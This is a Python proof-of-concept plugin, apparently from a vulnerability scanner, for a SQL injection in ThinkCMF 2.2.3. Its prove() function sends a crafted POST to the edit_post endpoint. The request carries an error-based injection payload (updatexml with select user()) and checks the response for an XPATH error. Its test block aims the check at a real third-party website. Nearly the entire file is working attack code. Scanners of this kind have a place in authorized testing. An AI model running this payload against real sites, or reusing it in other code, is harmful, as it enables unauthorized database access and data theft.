#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'
# https://xz.aliyun.com/t/3529

def info(data):
    info = {
        "name": "thinkcmf 2.2.3 sql",
        "info": "thinkcmf 2.2.3 sql",
        "level": "high",
        "type": "sql",
    }
    return info

def prove(data):
    init(data,'thinkcmf')
    if data['base_url']:
        url = data[
                  'base_url'] + "index.php?g=Portal&m=Article&a=edit_post"
        _data = 'term=123&post[post_title]=123&post[post_title]=aaa&post_title=123&post[id][0]=bind&post[id][1]=0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))'
        res = curl('post', url,data = _data)
        if res != None and ':XPATH' in res.text:
            data['flag'] = 1
            data['data'].append({"flag": url})
            data['res'].append({"info": url, "key": "thinkcmf 2.2.3 sql"})
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))